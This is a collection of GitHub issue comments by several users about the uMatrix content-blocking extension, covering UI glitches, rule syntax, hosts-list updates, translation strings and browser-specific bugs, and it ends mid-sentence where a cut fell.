    "Penguin-Guru": "I've been using an extension called Stylish lately to adjust C.S.S. It has a \"style template\" sharing interface that is very convenient since it is only two clicks and provides a nice preview. Perhaps this could provide a good reference? I have described what I imagine below. This would be designed for quick adjustments and sharing, not for bulk scope management. Bulk scope management is basically already provided by the \"Options>My rules\" page, although it might be useful to separate imported rules to be committed, at least temporarily.\nA single button, perhaps left of Refresh in the drop-down, could open a dialogue or simply change the drop-down panel to review/edit the current scope before uploading. This would ensure users know what is being submitted, doubling as confirmation, and allow them to  add comments and name/describe the rule set.\nFor those installing, they could select from a list of names or use arrow buttons to preview the new rule set before applying and refreshing (one button). If rules are previewed in the normal matrix panel, comments could be displayed above, or floating below or to the side depending on the display size. This would allow users to read the notes, or any other non-matrix rule information without opening the settings menu; perhaps they should only display when previewing.\nTheoretically, I don't think it would be necessary for templates to be explicitly named or described since the scope and rules would clearly identify them and comments could be used to indicate the rules' purpose. The only problem I imagine would be those rules for domains that have not yet been referenced by the active page, which would have to be added to the matrix for preview and might be a bit confusing. Realistically, I don't know how many users would properly comment their scopes so it might be worth providing a blank name field \"## Name: \" in the header to encourage good practice, or just requiring a name before uploading to be safe.\n. I think real-time support and a highly organised forum are important, but not worth Gorhill's time. I would be happy to contribute if there is a method, otherwise perhaps Gorhill could establish an official Freenode channel and we could take it from there. I am not familiar with modern forums but I would be happy to look into it so long as it is ultimately controlled by Gorhill (i.e. official).\nI hope necro-bumping is acceptable for open issues. :p\n. I have experienced this issue on Chromium with a 1366x768 but I believe it was before this post. I assume this fix is not applicable.\n. None of my business here but I believe objective assessment of how reported issues are handled is a worthy issue to improve a technical project. In this case, perhaps not objective, but please do not report users for trying to improve a project. The project admin has the power to close issues and should be able to handle problematic users at their discretion. If somebody told me to take a vacation, I would certainly not take offense at it.\n. After two weeks of occurring consistently, the problem has suddenly disappeared... I think it may have been fixed when I toggled the extension off for use incognito but I don't see how that would be related. Probably some sort of glitch in the matrix. Chrome needs to be restarted after that setting is changed so perhaps it rebuilds the extension? In any case, it seems likely a problem unique to my system. Closing the issue, sorry for the trouble.\n. Alright, thank you. I think it would be nice if this functionality could be made more accessible for others but it is (barely) accessible enough for me. Very interesting method! I will try scripting it in the future.\nIf it is possible to detect incognito state, the incognito rules could at least be grouped into a separate tab or collapsed menu in the interest of privacy and to allow for easily clearing only those rules. Then those rules could be handled differently, ideally they would not be applied for normal browsing and then they would be deleted automatically when the incognito session ends. Normal rules could be copied into the incognito rule list when the session begins so that modifications incognito are not applied to the normal rules. This behaviour is probably more intuitive for incognito, if it is even possible, but I understand that it might not be worth the work. Just an idea. The simple warning would really be enough of a precaution.\nI think it is (or was) possible: http://stackoverflow.com/questions/11928788/how-to-detect-incognito-mode-from-extension-background\nFull disclosure, I'm not a programmer and I really don't know very much about how Chrome works. What I said above may be totally wrong but I do want to help improve uMatrix if I can.. Ah, I suppose this behaviour makes sense most of the time. I will go ahead and close this ticket unless you want to leave it open. Thanks for the quick reply and great extension. :). ",
    "TonnesM": "@gorhill \n1. Are you sure you don\u2019t need to invalidate the 3 additional (changed) ubiquitousRulesPageName, hostsFilesAutoUpdatePrompt & hostsFilesExternalListsHint strings for locales on Crowdin to to prevent them from remaining unnoticed?\n2. While at it, can you please remember not to include trailing periods for option text strings such as \"Auto-update assets\" and fix it?. > Do you know how this can be done without having to go through all translations?\nSorry I don\u2019t know, not even with (temporary?) managing permissions. ;) Yet there must be some way to do this quickly.\nSide note: in general, the period issue is also valid for tooltips.. >  remove spurious trailing periods (#30 (comment)) \nThanks for fixing those. Sorry for being picky while at it, but spurious periods probably also apply to matrixMtxButtonTip, matrixPersistButtonTip, matrixRevertButtonTip, (not matrixReloadButton as this has an additional line), privacyDeleteBlockedCookiesPrompt and statsPageLogSizePrompt2 (if still used).\nAdditionally, \"Backup to file...\" should probably be \"Back up to file...\", as with uBlock (verb intended).. ",
    "uBlock-user": "I'm seeing a new icon in the popup UI in v1.3.3.1 - https://i.gyazo.com/a05b63773ec7ffdf14aca126ea4b2627.png \nThe one besides the eraser, but it doesn't have a tooltip defined. What is it ?. Nevermind, inspecting it reveals it's a button for the toggling recipe rules ? Seems you forgot to add the tooltip for that.. As long as there's an issue tracker, duplicates, invalid and irrelevant issues are bound to be opened by people, that's a universal problem with the system, even Chromium's issue tracker is filled with such nonsense. So either you can disable issue tracker for good, and have zero annoyance or keep it open and indulge yourself as they keep coming. There's no true solution for this.. So what should I do ? Remove uMatrix ? Also why does it happen randomly since it's already a documented API restriction ? It should happen everytime then, not randomly.. and then whitelist blocked resources from one of the extensions to avoid this ? Will that work ?. Forget to add, I have ||$websocket in uBO. Can that be the cause ? I'm not blocking 1st party anything in uMatrix. Only third-party and black listed host files in uMatrix.. Reinstalled uMatrix. These are my saved rules - http://pastebin.com/raw/hu0pTPx5\nLet me know if you need anything else. Also if ||$websocket is causing it, I can't really remove it as I enjoy the benefits of all websocket connections being blocked by default and I don't  have to worry about adding websites everytime I find some websocket sending some ads, so is there any alternative around that ?\nThe fact it's difficult to reproduce is what pisses me off. You probably won't believe it but I removed and installed uMatrix around 6 times already because of this, I just can't figure out how to stop it from occurring. Tried disabling all settings and renabling them to see any difference and it's the same.. Removing that would cause 3rd party video players to be blocked, that's why I have allow them. Case in point, couchtuner hosts 3rd party video players and without that rule, they won't load or appear, so that's the issue.\nEdit - Okay I turned it to * * frame block, so basically only the websites which are whitelisted like this * thevideo.me * allow will be able to load frames, that takes care of it.. Well with the lack of recommended rules documentation for websites in general, I had to come up with something that won't bother me every now and then as that host and many others are used on several websites and I'm using uBO, so whatever I whitelist in uMX most of it gets blocked in uBO as I have very narrowed global rules in uBO, thats why I give some leeway to uMX and don't go hardcore on it. That's why those narrowed global rules in uMX are not suitable for me as they will cause more trouble to me. Also my key question is can this be fixed with a tweak in rule set/settings ?. >Things like recommended rulesets is something we the users should work on\nSpeak for yourself. That's your opinion, I disagree. The actual work you talk about has already been done, there's nothing left and uMX is already a full working extension. . This comes close to what you want - * * * allow\nThat's allow all/block exceptions model.. Cannot reproduce. Disable all other addons and try to reproduce it again. No issue with the website either.. > uMatrix should provide a feature-blocking switch for Canvas, WebGL, WebAudio and multiple JS APIs that are abused for fingerprinting\nWhat's the point ? The website will choke and break. These specific APIs are used, for example, by Twitter and Youtube and blocking one of those breaks their functionalities or breaks the entire website altogether. Blocking the JS itself renders all these APIs dead. . > i do not see at all in the log:\nI can see in the log and in the console and it's detected on the web workers switch too. > If you have uBlock Origin, you can try using Inline Script Tag Filtering.\nThat only works for Firefox, not all browsers, so not worthy of being suggested as a generic solution.. It occurs randomly, so you won't be able to reproduce immediately, you will have to browse for a while and keep opening popup UI and click anything on it to see it's responsive or not. \nAlso can you check popup.js and popup.html files ? The issue appears to be stemming from there. It only happens with uMatrix, uBO and others work fine.. Mine started happening since I updated Chromium from 57.0.2960.0 to 57.0.2970.0. It's completely random, so it becomes very difficult to catch. For me, it happens when I open the popup panel and click on anything. Either it becomes unresponsive or the entire CSS of the panel gets fucked up like in the first pic I posted.. ~~Closing this as the issue has reached an impasse.~~\nShould be fixed in #711 . @gorhill Happens on behind-the-scene scope on current uMatrix dev build with Chromium 65\n\nSTR\nRemove matrix-off: behind-the-scene true rule and commit the removal.\nBrowse to chrome-extension://eckgcipdkhcfghnmincccnhpdmnbefki/dashboard.html#hosts-files\nClick Purge all caches followed by Update Now\nClick on the uMatrix extension icon to open the PopUp UI and scroll to the end to notice the entire row with the domain pgl.yoyo.org has been cut.. Similar to what I'm facing here - https://i.gyazo.com/b1d0f19bae034763505f21c19340558d.png\nMine happens randomly though and on any page.. > it occurred to me once while testing uMatrix\n@gorhill Were you able to reproduce my bug or this bug ?\nSecondly, for my bug, you need to have Chromium 57 or 58, install uBO and uMatrix, run them together for a while and if you click on any cell on the matrix, the cell will be unresponsive and when that happens if you right click and inspect that cell you will see what I posted in the picture. \nAlso, I have few additional Hosts File list for uMatrix if that makes any difference.. Disable uMatrix for that website entirely via matrix-off: example.com true or use global-allow/block exceptionally mode. You do have options like these. Both of these options require to be done only once.. Yes that's what I have been experiencing since Chromium 57 too - https://github.com/gorhill/uMatrix/issues/689\nNot just when selecting matrix filtering, but also when allowing or blocking a cell in the matrix too.. > Install Chromium 57 or 58, install uBO and uMatrix, run them together for a while, click on any cell on the matrix, or enable/disable matrix filtering for the current scope, the cell will be unresponsive and/or UL will glitch and when that happens if you right click and inspect you will see what I posted in the picture.\nCan you try that, gorhill ?\nHappened just now on this issue tracker : \n. Sometimes it happens to me twice or thrice in succession which is so frustrating as I have to keep refreshing and hope it goes away \ud83d\udca2 Btw I'm on Chromium 59 and the issue still continues to happen.. Happens in 0.9.9.4 too however once in a while and not as frequently as in 0.9.3.6.. I can reproduce it sporadically, happened twice till now.. same as this - https://github.com/gorhill/uMatrix/issues/729#issuecomment-286824739 \nThe only difference now is that it happens hardly once or twice rather than every now and then like it did in 0.9.3.6.. Already there in the UI.\nAlso you can add rules like example.com example.com script block or * example.com script block. You can disable the new material design interface for Settings page via chrome://flags if you want and it will be back to old behaviour.. > I don't see a flag to enable in chrome://flags\nchrome://flags/#enable-md-settings\nSet it to Disabled. No, contrary to what you believe, I would rather have uBlock swap the order, I find uMatrix's order perfect by design.. yes because he added the quick fix for UI Glitch issue and changed nothing else.. > because it downloads it, but then nothing\nThat's a permissions issue with the Firefox android app, allow all permissions the app asks in your Android tablet and see if it happens again.. @gorhill Shouldn't that be directed at @TriMoon ? I didn't request the android version, he did.. @TriMoon So what was it ? I faced the same issue with uBO on Android, and it turned out to be a permissions issue.. Surprisingly, I haven't been able to reproduce the bug for a quite some time since the past few updates on Chromium v59 with uMX v.0.9.3.6. So it will stay like this ?. @VictorSu000 Open settings and set the settings mode to Advanced mode, scroll down to the end and in Security category somewhere, there's a CSP setting, disable it.\nRead - https://github.com/gorhill/uBlock/issues/2074#issuecomment-254169776\nIf you don't want to do that, then use ViolentMonkey instead of TamperMonkey.. Whitelist all third-party domains on youtube.com for the time-being and see if it still happens, that will verify whether it's a ruleset issue or not.. https://bugs.chromium.org/p/chromium/issues/detail?id=724811\nEdit - It appears it's still not patched and is happening in the latest bleeding edge build still!!!. Filed a new bug report which is reproducible - https://bugs.chromium.org/p/chromium/issues/detail?id=726974. Disable referrer/useragent spoofing along with strict HTTPS and check if it still happens.. The eraser button doesn't work after clicking on global scope button (*) in the UI, so you can't revert that change from the UI. \nOkay, it appears padlock button also doesn't work after clicking on global scope button.. Thanks for the quick fix, and yeah missed one more namely \"Revert all temporary changes\". Okay thanks.\nCan you do something about the white layer that is added on top of sub-domains in the POP UI ?\nHere's the pic below - \nhttps://i.imgur.com/Gy17slm.png\nThat white layer looks very odd and disturbing to me.\n. @theDuckIsAlive I'm already aware of that and I don't want to set it scope level to site because then I would have to create rules per sub-domain, which is ridiculous as there can be lots of them.. @gorhill I'm not asking you to go back, I'm asking you to remove the white layer only, can you please do that ? clicking once should set sub-domain then again to > domain  and then again to > global, not white CSS layer on it, that's all.. \nThe red arrow pointing towards the white border, can you see that ? That one.. > How would you suggest to present the non-active part of the local scope?\nJust remove the non-active part perhaps, if the setting is set to Domain and if the person browses to the website's sub-domain, then don't show the sub-domain scope at all disabled or not disabled, show the domain scope instead because the domain is set in the setting instead of showing the sub-domain disabled.. >  I might want to set rules specific to groups.google.com).\nThen do it manually as the setting to Domain is set by default in this hypothetical case.. It's not just looks very odd and disturbing to me it rather confuses me and I end up creating rules for the wrong scope, but then again, it's about me as you say, so I tried to convince and I know you're not gonna change but I tried, so yeah lets leave it at that.. > Removing the ability to select a narrower scope would be a downgrade from before, this has always been possible.\nAgain, I never said that, why do you keep mis-understanding me ? What I said/meant is removing the ability to automatically display the sub-domain scope (disabled or not) when a person who has set the default scope to Domain via thedashboard.html and happens to visit a sub-domain of a domain. Keep it manual, so if he still wants to see the sub-domain scope he has to set it himself.\nIs that clear enough for you ?  If not, then forget it. I can't be anymore crystal clear any further.\nNevermind, lets forget it. I'm the only one with the issue here, so I guess I will have to get used to it.. @ArchangeGabriel well how would telling me that would help ? I already made my peace with the issue I have, you should tell that to gorhill rather if you want to further extrapolate on this issue.. According to https://github.com/gorhill/uMatrix/commit/f8a4630095377793061a302c6a65959d09efa12e, it appears to have been removed.. I'm on Chromium 64, can't reproduce.. Before the commit, in Chromium, opening newtab, the scope was set to google.com, if you had Google as the default search engine, now it correctly sets to newtab.chrome-scheme, so thanks for the quick fix.. Probably a bug with FF 57, hasn't happened to me on FF 59 yet.. > @gorhill's fork of Chromium or Firefox - with privacy enhanced, in which all that spying stuff is removed. \nUse Chromium custom built from https://chromium.woolyss.com/. > I believe that's what I am using:\nhttps://en.opensuse.org/Chromium\nYou didn't mention this anywhere, otherwise I wouldn't have suggested. If you're going to be paranoid about privacy, then I suppose you won't be using any Android based phones or iOS based devices either. They do a lot more there than they do on browser. Not to mention, Windows talks to MS too if you ever caught that.\n. > What about using matrix-off: behind-the-scene false instead of behind-the-scene * * block ?\nRemoving the matrix-off rule itself would block all behind the scenes requests unless you whitelist a cell.. HTTPSwitchBoard was that extension, then it was split into uBO + uMX. . https://github.com/gorhill/uMatrix/wiki/About-%22the-page-is-still-broken-after-I-created-all-necessary-rules%22. Why default ? Just because you use that extension, doesn't mean everybody else does. Whoever uses it is expected to add that by themselves.. > allowing a lot of viewed pages to be logged by trackers.\nNot possible if trackers are blocked.. > track some things like fonts installed on user OS, browser resolution \nIt's already being done by various fingerprinting methods, so this is not news anymore.. Not a bug, \nAdd archive.fo archive.fo image block\nFavicons are images, so blocking images for the specific domain blocks favicons too.. Can no longer reproduce. Aformentioned bugzilla bug has also been fixed for some time.. https://github.com/gorhill/uMatrix/issues/771#issuecomment-297524209\nYou can use ScriptSafe for that, if you really miss it that badly.. > If the default is deny then why are these needed?\nNOT everyone runs in default-deny mode, if you ever ran uMatrix in allow-all/block exceptions mode then everything will be whitelisted EXCEPT for entries in any HOSTS files the user has subscribed to. Incase he hasn't, the ad-servers/malware will also be whitelisted and will create havoc for the user who wants to run in allow-all/block exceptions mode, that why HOSTS files are supremely important to have on.\nSecondly, HOSTS files are all purpose lists which can be used for blocking ads/trackers/malware and what not on OS level too, they're not restricted to uMatrix only. Any entry in HOSTS files on uMatrix put under blacklisted domains category which informs users to know that these are NOT meant to be whitelisted incase if the user is wondering. \nIn @gorhill's own words and I quote \"uMatrix can be set to work in allow-all/block-exceptionally mode with a single click on the all cell in the global scope *, if you prefer to work this way. This will of course break less sites, but you would then lose all the benefits which comes with block-all/allow-exceptionally mode -- though you will still benefit from the 62,000+ blacklisted hostnames by default.\"\n. > but I expect you'll restrict and lock this thread like you usually do. \nBecause of you going offtopic with the whole \"Default third party rules are dangerous.\" thing which is not the issue created by the OP and I think you rather have incorrect or misguided understanding when it comes to 3rd party filter rules.. > except that it would be the default behavior here\nbut will it be still added as a switch ?\n. Won't happen unless you add a rule like no-workers: * true or no-workers: just-run.it true. https://github.com/gorhill/uMatrix/wiki/About-%22the-page-is-still-broken-after-I-created-all-necessary-rules%22. > Tried blocking these scripts with ScriptSafe, it also doesn't work with Vivaldi, but works with Chromium.\nThat itself proves that the issue lies with Vivaldi. Report to the devs.. Sounds like https://github.com/gorhill/uMatrix/issues/912. @Tomalak Try settingdisableCSPReportInjection to true. If it works, that confirms that it is indeed #912.\n. @gorhill Seems the bug got fixed today in Chromium 66.. https://github.com/gorhill/uMatrix/wiki/About-%22the-page-is-still-broken-after-I-created-all-necessary-rules%22. If you've uBlock Origin installed, you can use, \n||example.com^$csp=upgrade-insecure-requests. @gorhill same issue with custom hosts lists too.. So why does it happen with the custom file list of mine ? \nhttps://raw.githubusercontent.com/uBlock-user/uMatrix-Hosts-List/master/hosts.txt\nBefore update the total number is 24,149\nI added a new entry called 0.0.0.0 analytics.github.com just to check whether it takes it or not.\nI forced update, it remains the same as 24,149.\nThen I remove the custom list by clicking the trash bin icon and add it back - the number changes to 24,150.\nThis didn't happen before. When I click Update now, it would fetch the newest version and the number would change i.e. become 24,150.\nCan you explain that ?. How do I verify that for this issue specifically ?\nIf I click on the listing it opens chrome-extension://eckgcipdkhcfghnmincccnhpdmnbefki/asset-viewer.html?url=https://raw.githubusercontent.com/uBlock-user/uMatrix-Hosts-List/master/hosts.txt\nwhichs shows the updated version, but the number count won't go up.. Added another entry 0.0.0.0 analytics.screenrant.com to my listing.\nClicked on Purge All Caches and still no effect. The number remains the same even though the count should have gone up to 24,151 from 24,150. I suppose this is a cache issue.\nThis has never happened before, not sure why it is happening now.. The only way it updates for me is if I remove the list and add it back.. There you go - \n\nIt fetched 145 KB, so it's not from cache, and the number still remains the same. \nI found this too in the console - \n\n. Funny thing is, this doesn't happen with uBlock Origin, I mark it out of date and then click on Update now and it gets updated successfully.. The issue is still going on, the number won't update after marking out of date and clicking on Update Now. This didn't happen before like this.\nBut if I deactivate the specific list, click Apply Changes and then activate and click Apply Changes again, the number updates.. I'm asking for a solution, how do I deal with this ?. > You focus unduly about a number\nSo how do I know that the list has been updated or not ? That number is the only way to know.. Fine, if that's the acceptable way then why is it different with uBlock Origin ? Why isn't the behavior same there ? . The number updates after the update is complete with uBO, I see that as a difference.. On my end, it did.\nResource Abuse updated and this is the result..\nBefore update -\n\nAfter update -\n\nThis is just one example, every list I update, gets a change in the number count if the change has been made by the maintainer, on uBO.\n. > So?\nSo I made my point, the number changes when I force update the list on uBO, since you said \"There is no difference with uBO.\" That's the difference.\n\nYou provide no details as to when was the last update for that resource.\n\nFew days ago, a week perhaps, I don't exactly keep a date in mind.. > Now try again:\nObviously it wouldn't change now, because I just updated it to show it to you and it just changed now.. But in case of uMatrix, I updated the filter list today and there was no change, the last update I made was also a week ago. Do you get my point now ? If not, I rest my case. I can't be more crystal clear anymore.. > Feel free to find other people who can side with you \nWhy would I want anyone to \"side\" with me ? If people want to support on their own then it's fine. I don't want anyone to fight the case for me. I reported it because I'm facing a difficulty in ascertaining whether uMatrix was able to update the list or was it still pulling from the cache, and from the appearance it's still pulling the cache and since I'm the only one appear to having this issue, I will let it go.. I'm just glad this finally got your attention. Thanks to @nameless3 for taking his time and posting his findings.. Was this a regression after implementing selfies in uMatrix ?. @gorhill A vertical white space-line appears near the scroll bar in popup UI since 1.3.3.9\nSTR\nBrowse - https://www.washingtonpost.com/news/the-fix/wp/2018/03/07/the-7-most-interesting-parts-of-stormy-danielss-lawsuit-against-trump/\nOpen the popup UI\nNotice the vertical white-space line near the scrollbar like this - \n\n. I haven't seen it before 1.3.3.9, can you take a look ? It only happens on websites where there are lots of connections made which causes the scrollbar to appear in the popup UI along with the vertical white space.. I can still reproduce it on Chromium 68, I don't think it's a regression anymore, it would have been fixed by now.. > I can still reproduce it on Chromium 68, I don't think it's a regression anymore, it would have been fixed by now.\nDoesn't happen in Chrome 71 appears to be been fixed, reproducible on 69 though, so it was a regression after all.. Doesn't happen on Chromium 66.. It's a bug in Chrome, which got patched in v66. Use workaround setting untill v66 hits stable in April.. @gorhill Will this finally fix all such \"extension errors\" invoked via CSP header modification or only this one in particular ?. ~~Will it work on Chromium ?~~\nWorks as expected on Chromium.\nTo experiment, add ||github.com^$csp=default-src 'self' 'unsafe-inline' 'unsafe-eval' *.github.com *.githubusercontent.com in uBO and on uMatrix(v1.3.3.x) add no-workers: github.com true and then visit github.com, a CSP notification error will appear in extreme right burger menu in Chrome, now repeat the steps with uBO version 1.15.11.14, it doesn't happen anymore.. Cannot reproduce on Chrome 67/69 and neither on Firefox Nightly.. > Still happens for me and now the versions are different.\nThat's not the same issue as described by the submitter. . > For example if i visit kernel.org after facebook.com i will see the facebook too as seen in the pic\nOn second thought, this only happens if you visit facebook.com first because the client intermittenty exchanges data by firing XHRs to facebook.com and uMatrix doesn't clean the slate if you browse to a different website right when a simultanoues data exchange is occuring, hence uMatrix purposely keeps it there.. @gorhill made a video to show it looks like \nhttps://i.gyazo.com/481af3f199ee9e42f9ad0975f80b3cd9.mp4. Not completely same, when I click the revert button the new rules in temp get deleted, but the button remains active, and so does the commit button. The buttons are getting stuck, that's the issue.. > Whether this occurs in stable release of the browser\nI don't use stable builds of Chromium, so can't test.\n\nWhether errors are reported in page and extension console\n\n@gorhill \n. Were you able to reproduce ?. > Solved by exporting rules to a file, editing and deleting all rules, then re-importing the rules from the file.\nIf it works for you, then that's a workround, NOT a solution when the bug exists in the extension itself. I could fix it too by rebooting chrome that way.. ~~Well, I guess you were unable to reproduce ultimately, so I will close it.~~\n-- Fixed with 1.3.5.0 dev build.. > Already reported\nWhere ? . on google.com I get 4 resources blocked in the counter while the matrix only shows 3, so I ran the logger and according to the logger the counter matches to 4, 2 scripts, 1 image, and 1 cookie, then I refreshed the page and the matrix now matches the counter badge.. https://github.com/gorhill/uMatrix/wiki/Rules-syntax. It's blocked by Dan Pollock's HOSTS File, and uMatrix merely enforces full blockage because the domain is listed there. So contact them or unblock it yourself.. > #341 \n? . Oh yeah that, you quoted specific part of my reply, so I thought you were linking me to something else.\nThis is how I do it..\nname.domain name.domain * inherit. I can reproduce. Activate Enable cloud storage support  and click on My Rules, try to scroll to the end and will cut before the end. Deactivate it to go back to normal scrollable end.\n@gorhill Setting height of the div codeMirror Container code MirrorMergeContainer vfill-available after the cloud widget is added from 512 to 440px seems to fix the issue. \n. > Fix will be in dev build 1.7.3b1\nThat's awefully far, or did you mean 1.3.7b1 ?. https://github.com/gorhill/httpswitchboard/issues/133#issuecomment-42762309. probably a broken build of SRWare Iron.. I'm able to update uBlock Origin's FilterLists so it's not my connection either.. Adding that worked. But I didn't have that in 1.3.7.1 and it worked there, so how come it won't here ? Also the scheme is behind-the-scene as per the popUI - https://i.gyazo.com/44e402218a6ad279f62cf4ddcfdaf2f4.png. > The current issue is a side effect of this fix: the \"initiator\" in the current case is the extension URL: chrome-extension://[extension id], hence why matrix-off: chrome-extension-scheme true is needed.\nSo we will have to add that rule otherwise all behind-the-scene requests will be blocked unconditionally ?\n\nNow the real issue is the logger not informing properly about this, it still shows the network request as being from the behind-the-scene scope, while it has been re-classified internally\n\nThat means the scope it should have shown in the popup UI is chrome-extension-scheme instead of behind-the-scene ?. Removed matrix-off: behind-the-scene true and added matrix-off: chrome-extension-scheme true and it still works. So behind-the-scene is now chrome-extension-scheme ?. Well for now, matrix-off: chrome-extension-scheme true will be required to be added(if not present already) untill you decide, that's for sure.\n. I meant for those who removed it, since it didn't affect untill now.. So it's still an incomplete fix ?. Thanks. I don't know that as I don't use Crowdin.. I first did it for the en locale, but not for the rest, so I decided to finish doing the rest too fyi. Closing it since you're getting them all from Crowdin.. \nSome pages are internally translated to chrome-scheme as per uMatrix, while some like vivaldi://settings make use of vivaldi-scheme.. I didn't add any checks, if that's what you mean, just the required header for uMatrix to get COOKIE blocking and REFERRER blocking functionality back.. > It's fixed on my side since yesterday\nHow ? It affects all the dev/beta builds of Chromium. I can still reproduce, so what changed on your side ? \n\nwhether this is Chromium.\n\nI looked for Chromum folder and it only had a python file and nothing else.. Does this affect uBlock too ? Lets say I have a scriptlet thats designed for not sending cookies, would it work without extraHeaders in uBO ?. No my question is will my cookie blocker scriptlet work or to simply put are scriptlets affected by this ?. ",
    "mikhaelkh": "@gorhill, can you clarify recipe syntax? The way I see it:\nname\n    source destination\n        source destination [type [action]]\nRecipe is shown if exists a request matching 2nd line.\nIf a rule with the same source destination type and different action already exists, it is not overwritten.\naction is always omitted in uAssets/recipes/recipes_en.txt, is it optional or always allow?\nAre global recipes (source destination = * *) allowed?\n. Is there a way to launch *.sh with specified home directory?\n. I have version 0.8.1.3, latest in Chrome Store\n. There are 5 mirrors of this list. Maybe another server doesn't have bandwidth problems.\n. I know there is no point of adding it to package, But why when I add a custom URL http://hosts-file.net/download/hosts.txt, it can't process it? The list updates monthly.\n. By \"split\" I mean create two buttons instead of one \"+\". I see space around button \"reload current page\" in both Firefox and Chrome. Or you can make popup wider.\n. You can remove \"reload current page\" button. I guess advanced users can use F5 to reload page.\n. This issue is not about uBlock, it's about uMatrix.\n. So any ad server which uMatrix supposedly blocks through hosts lists can install cookies? If network requests are cancelled before they leave the browser, how can a site install a cookie?\n. It turns out you need to install this extension to reproduce the problem.\n. Privacy for extensions now allows crappy ones to do what they want;(\n. This webpage is not available (ERR_NAME_NOT_RESOLVED). Again.\n. Now I can't update Malware Domains (and long-lived) from https://malwaredomains.lehigh.edu/, the https version is not avalible. I tried several times last week. Maybe change https to http?\n. As I see it, the main goal of this request is to make \"My rules\" tab easier to work with.\nBut grouping is not the best way to make it happen. Also, it complicates the implementation of my ideas.\nI think the best ways of improving usability are:\n1) Search. Hide rules that doesn't contain given string (or doesn't match regexp).\n2) Diff. Hide the same rules in Permanent and Temporary halves. Useful to review what you've changed before closing the browser.. Are storages being cleared in Chrome? I unchecked all hosts files, purged all caches. Storage used  didn't decrease and stayed at ~3.3MB.. @ssokolow all blue buttons are scope-specific, all black buttons are not. While I think that while the UI isn't perfect, the scope selector change was definitely good, you're just used to dropdown list, after a while this makes perfect sense. My two cents:\n\n\nRevert all temporary changes button isn't grayed out when there're no temporary changes like Revert temporary changes for this scope.\n\n\n\nIf a cell has a permanent rule assigned to it and you change the state of the cell, you will see that the permanent state and the temporary state become different as a result.\n\n\n\nWhy add \"If a cell has a permanent rule assigned to it\" condition? Isn't the approach to always show permanent state of the cell in the corner better, including indication that there's no permanent rule?. ",
    "anewuser": "@gorhill are you going to host only the English recipe, or are recipes for other languages also allowed? I've started this https://github.com/anewuser/uAssets/blob/patch-3/recipes/recipes_pt.txt. uBlock Origin is already signed: https://addons.mozilla.org/firefox/addon/ublock-origin/ , so it's going to happen to uMatrix soon too.\n. Please close this issue. . You can use this simple extension to change it quickly: https://addons.mozilla.org/firefox/addon/quick-accept-language-switc/\n. Firefox extensions may no longer access local files. Please close this.\n. Well, I've found the cause of the download problem. My Redirector rule to clean up URLs was removing a necessary parameter from the final generated download URL.\nI'll leave this here just in case I find any case where uMatrix deletes a cookie and that actually breaks something.\n. Duplicate: #435.\n. \n. The author of this project doesn't even use Windows. Please close this issue and ask somebody else to do it for you.\nThis issue tracker is for reporting bugs in the existing versions of uMatrix only: https://github.com/gorhill/uMatrix/blob/master/CONTRIBUTING.md\n. Please don't create useless issues like this on any repository. Just wait until the extension developers have some free time and then wait until the extension stores review and publish the new versions.. @zero77 Please don't make such a general statement. You may mention that it doesn't guarantee websites won't be able to identify it, but the sites I use it with only check for the actual user-agent info in the http request, so it works perfectly for my usage. Example: 4shared.com along with a mobile user-agent.. By default, uMatrix blocks all external scripts, including cryptocurrency miners. There's no need to use special lists for that. Since you don't seem to understand how it works, I suggest you to uninstall it and use uBlock Origin instead. It does include a list of miners: https://github.com/gorhill/uBlock#installation\nPlease close this issue and do not post any more questions here. Use this page instead: https://discourse.mozilla.org/t/support-umatrix/5131 . As I told you, please close this and stop asking questions here, or the issues tab for this repository may be closed for everyone again. The developer is tired of people who don't read https://github.com/gorhill/uMatrix/blob/master/CONTRIBUTING.md. @Xmetalfanx uBlock Origin already includes its own \"Resource abuse\" list by default, and you can report missing filters at https://github.com/uBlockOrigin/uAssets/issues . It uses the same kind of filters in your link (like partial/specific URLs).  uMatrix, on the other hand, includes lists that block full hostnames, since this is what this extension is able to do.\nIf you want to discuss or suggest anything else, don't post comments on GitHub bug trackers. Do it  at the places indicated by \n\nhttps://github.com/gorhill/uMatrix/blob/master/CONTRIBUTING.md \nhttps://github.com/gorhill/uBlock/blob/master/CONTRIBUTING.md. https://github.com/gorhill/uMatrix/blob/master/CONTRIBUTING.md#submitting-issues. \n",
    "ArchangeGabriel": "This is almost perfect for me, the only thing I\u2019m not sure about is this part:\n_ somecdn.com *\n_ somecdn.com script\n_ somecdn.com frame\nFirst, the role of * in this context is not clearly defined in my opinion, and second, I don\u2019t understand if and then why if only scripts are need there should be an * rule. But maybe that\u2019s because I don\u2019t understand the * rule in the first place, which brings us back to my first point.. Right, missed that this was stated above. So it clearly appears that I don\u2019t understand the * rule, since I don\u2019t see why allowing xhr and script at the same time would require an * rule technically. Doesn\u2019t the * rule just imply that image and css are allowed?. OK, make sense to me now. I think this means I should change my rules from:\n* 1st-party cookie block\n* 1st-party script block\nto:\n* * cookie block\n* * script block\nif I intend to use preset rules (my understanding being that using preset rules would help reducing the size of my custom rules).. @aleksejrs: https://github.com/uBlockOrigin/uAssets/tree/master/recipes. Can\u2019t you just cut the text with \u2026 at the left to avoid overflowing and add a tooltip with the full content when hovering the cell?\nI\u2019ve faced multiples instances of this myself, last one is attached.\n\n. Maybe this should be closed if the UA spoofing feature is removed.\u202f;). If using Firefox, look at privacy.resistFingerprinting.. What you want then is more likely some implementation of https://github.com/mozilla/multi-account-containers/issues/309.. @zero77 privacy.resistFingerprinting Not sure this is the best source of information about this, but that\u2019s the one I\u2019ve been reading.. As well as ytimg.com is third party on youtube, but AFAIR this one doesn\u2019t work properly without this.\nAFAIK that\u2019s expected behaviour, you\u2019re the one in charge of white-listing appropriate 3rd-party (in the sense of originating from another domain).. Though I\u2019ve just seen your edit, and I\u2019m more perplex now\u2026. I\u2019ve read it (else I wouldn\u2019t have noticed twimg.com for instance) but it\u2019s only when you edited your title that I\u2019ve realized you were talking of browser shortcut, not eventual twitter shortcuts.. If you block scripts for the main domain, it works again too. I suspect they try to override Ctrl+F in some way.. Now that I think about it, the real issue is more likely this: https://bugzilla.mozilla.org/show_bug.cgi?id=1147847. For image uploading, you have to add this to your rules:\ngithub.com github-production-user-asset-6210df.s3.amazonaws.com xhr allow\nI can reproduce your issue regarding sort when I enable UA spoofing, because GitHub disables a lot of features if your browser is \u201ctoo old\u201d (I\u2019ve just had IE as UA, even got a banner about my browser being obsolete).. @uBlock-user I want to have the default scope as Domain (because that\u2019s what is the most useful generally) but still be able to have the subdomain available just at one click.\nHowever I agree that this is quite ugly, but 